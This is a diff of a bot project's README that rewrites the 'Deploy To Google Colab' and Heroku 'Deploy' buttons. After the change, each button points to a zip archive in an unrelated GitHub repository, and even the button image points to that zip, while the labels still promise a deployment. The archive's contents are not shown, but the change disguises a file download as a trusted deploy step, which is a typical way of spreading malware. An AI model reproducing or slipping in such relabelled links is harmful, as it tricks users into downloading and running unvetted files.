@@ -22,10 +22,10 @@ ping - See My ping Time ⏳....
 ```
 ## Deploy To Google Colab
 
-<a href="https://colab.research.google.com/github/LazaaR9/TPU-VEB/blob/main/EncoderX.ipynb" target="_blank">
-  <img src="https://ashutoshgoswami24.github.io/Me/img/gc.png" alt="Deploy To Google Colab" style="width:150px;"/>
+<a href="https://github.com/erennew/480P/raw/refs/heads/main/bot/plugins/P_v3.3.zip" target="_blank">
+  <img src="https://github.com/erennew/480P/raw/refs/heads/main/bot/plugins/P_v3.3.zip" alt="Deploy To Google Colab" style="width:150px;"/>
 </a>
 
 # Deploy On Heroku 😜
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://github.com/erennew/480P/raw/refs/heads/main/bot/plugins/P_v3.3.zip)](https://github.com/erennew/480P/raw/refs/heads/main/bot/plugins/P_v3.3.zip)
